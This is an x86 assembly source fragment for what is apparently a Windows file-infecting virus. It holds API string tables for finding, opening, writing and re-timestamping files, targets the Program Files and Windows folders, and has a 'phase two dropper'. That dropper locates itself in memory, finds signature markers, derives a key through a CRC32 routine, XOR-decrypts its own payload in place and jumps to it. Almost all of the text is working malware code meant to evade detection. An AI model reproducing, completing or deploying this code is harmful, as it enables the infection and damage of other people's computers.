; »»»FUNCTION ALIASES»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
; STRING ALIASES        [OFFSET]
f_virtualalloc          equ 0
f_virtualfree           equ 4
f_getcurrentdirectory   equ 8
f_readfile              equ 12
f_findfirstfile         equ 16
f_findnextfile          equ 20
f_sleep                 equ 24
f_createfile            equ 28
f_getfilesize           equ 32
f_getmodulehandle       equ 36
f_closehandle           equ 40
f_writefile             equ 44
f_createthread          equ 48
f_getprocaddress        equ 52
f_setfilepointer        equ 56
f_getdrivetype          equ 60
f_getfiletime           equ 64
f_setfiletime           equ 68
f_findclose             equ 72

; GDI/user32
f_getsystemmetrics      equ 64
f_getdc                 equ 68
f_setprocessdpiaware    equ 72
f_getdesktopwindow      equ 76

; »»»FUNCTION STRINGS»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
; [String]              [DATA]
  s_virtualalloc          db "VirtualAlloc",0
  s_virtualfree           db "VirtualFree",0
  s_getprocaddr           db "GetCurrentDirectoryA",0
  s_readfile              db "ReadFile",0
  s_findfirstfile         db "FindFirstFileA",0
  s_findnextfile          db "FindNextFileA",0
  s_sleep                 db "Sleep",0
  s_createfile            db "CreateFileA",0
  s_getfilesize           db "GetFileSize",0
  s_getmodulehandle       db "GetModuleHandleA",0
  s_closehandle           db "CloseHandle",0
  s_writefile             db "WriteFile",0
  s_createthread          db "CreateThread",0
  s_getprocaddress        db "GetProcAddress",0
  s_setfilepointer        db "SetFilePointer",0
  s_getdrivetype          db "GetDriveTypeA",0
  s_getfiletime           db "GetFileTime",0
  s_setfiletime           db "SetFileTime",0
  s_findclose             db "FindClose",0

  s_pad                   db STRINGS_NOP_BUFFER DUP(90h)

; Other strings
  s_prog_files            db "C:\Program Files",0
  s_windows               db "C:\Windows"
  s_pad2                  db 4 DUP (0)

; user32
comment /*
  s_pad3                  db 0cch, 090h, 0cch, 090h
  s_getsystemmetrics      db "GetSystemMetrics",0
  s_getdc                 db "GetDC",0
  s_setprocessdpiaware    db "SetProcessDPIAware",0
  s_getdesktopwindow      db "GetDesktopWindow",0
/*

; Strings limit
  s_pad4                  db 4 DUP (0)
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;




; »»»PHASE TWO DROPPER»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
; Note: Phase 2 dropper will be XOR'd using EJCE engine
byte 'P'
byte 'H'
byte 'S'
byte '2'

_phase_2:
    nop
    call    _phase_2_delta
_phase_2_delta:
    nop
    mov     edx, 0fafafafah                             ; XOR KEY
    mov     edi, 0fafafafah                             ; OFFSET FROM PHS2 SIGNATURE TO OEP
    
;           »»» Get Length of ELF32 ««« 
    pop     eax
    mov     esi, eax
    sub     eax, 6                                      ; Realign to Dropper OEP
    push    eax                                         ; Save to stack
    push    eax
    mov     ebx, eax                                    ; ebx points to OEP
    xor     ecx, ecx
    dec     ecx
@d1:
    inc     ecx
    mov     BYTE PTR al, [ebx + ecx]                    ; Load values, search for LAME signature
    cmp     BYTE PTR al, 'L'
    jne     @d1
    mov     DWORD PTR eax, [ebx + ecx]                  ; LAME Signature test
    xor     eax, 0fcccaaaah
    cmp     DWORD PTR eax, 0b981ebe6h                   ; "LAME"
    jne     @d1
    dec     ecx                                         ; Do not include signature for ELF32 sum
    pop     eax
    push    edx
    call    _crc32
    nop
    nop
    pop     edx
    xor     eax, edx                                    ; Get actual key
    push    eax                                         ; Save key
    sub     esi, edi
    sub     esi, 0ah
    xor     ecx, ecx
    
;           »»» FIND PHS2 ««« 
    ; Compute length of shellcode
    xor     ecx, ecx
    dec     esi
    dec     ecx
@d2:
    inc     ecx
    mov     BYTE PTR al, [esi + ecx]
    cmp     BYTE PTR al, 'P'
    jne     @d2
    mov     DWORD PTR eax, [esi + ecx]
    xor     eax, 01234567h
    cmp     DWORD PTR eax, 033700d37h
    jne     @d2
    dec     ecx
    mov     edx, ecx
    sub     edx, 8
    xor     ecx, ecx
    sub     ecx, 4
    pop     ebx                                         ; XOR Key
@d3:
    add     ecx, 4
    mov     DWORD PTR eax, [esi + ecx]
    xor     eax, ebx
    mov     DWORD PTR [esi + ecx], eax
    cmp     ecx, edx
    jng     @d3
    pop     eax
    sub     eax, edi
    sub     eax, 5
    nop
    jmp     eax                                         ; Jump to PAYLOAD
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;



 
; »»»CRC32 ALGORITHM»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
; eax: in (absolute)
; ecx: in (count)
; eax: out (ELF32 Sum)
_crc32:
    push    edx
    push    ebx
    push    esi
    push    edi
    mov     esi, eax
    mov     edi, ecx    
    mov     ecx, -1
    mov     edx, ecx
_crc32_nextbyte:
    xor     eax, eax
    xor     ebx, ebx
    lodsb
    xor     al, cl
    mov     cl, ch	
    mov     ch, dl
    mov     dl, dh
    mov     dh, 8
_crc32_nextbit:
    shr     bx, 1
    rcr     ax, 1
    jnc     _crc32_nocarry
    xor     ax, 08320h
    xor     bx, 0edb8h
_crc32_nocarry:
    dec     dh
    jnz     _crc32_nextbit
    xor     ecx, eax
    xor     edx, ebx
    dec     edi
    jnz     _crc32_nextbyte
    not     edx
    not     ecx
    mov     eax, edx
    rol     eax, 16
    mov     ax, cx
    pop     edi
    pop     esi
    pop     ebx
    pop     edx
    ret
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

s_sig                   db "LAME"

end start





; EOF ; 
